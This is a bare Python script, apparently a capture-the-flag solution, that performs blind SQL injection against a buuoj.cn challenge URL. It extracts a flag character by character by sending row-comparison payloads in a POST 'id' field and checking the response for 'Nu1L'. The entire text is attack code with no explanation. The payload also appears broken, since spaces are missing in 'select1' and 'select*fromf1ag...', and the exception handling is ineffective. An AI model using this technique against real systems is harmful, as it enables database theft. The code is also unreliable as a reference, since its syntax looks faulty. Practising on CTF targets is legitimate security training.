#sql盲注
import requests
import time

url='http://d3f469ab-d547-4380-a755-4771a926acf5.node4.buuoj.cn:81/index.php'
flag=''
for i in range(1,50):
    for j in range(32,127):
        x=flag+chr(j)
        payload='((select1,"{}")>(select*fromf1ag_1s_h3r3_hhhhh))'.format(x)
        data={
        'id':payload
        }
        try:
            res=requests.post(url=url,data=data)
            if'Nu1L' in res.text:
                flag+=chr(j-1)
                print(flag)
                break
        except Exception as e:
            j=j-1
            break
        time.sleep(0.2)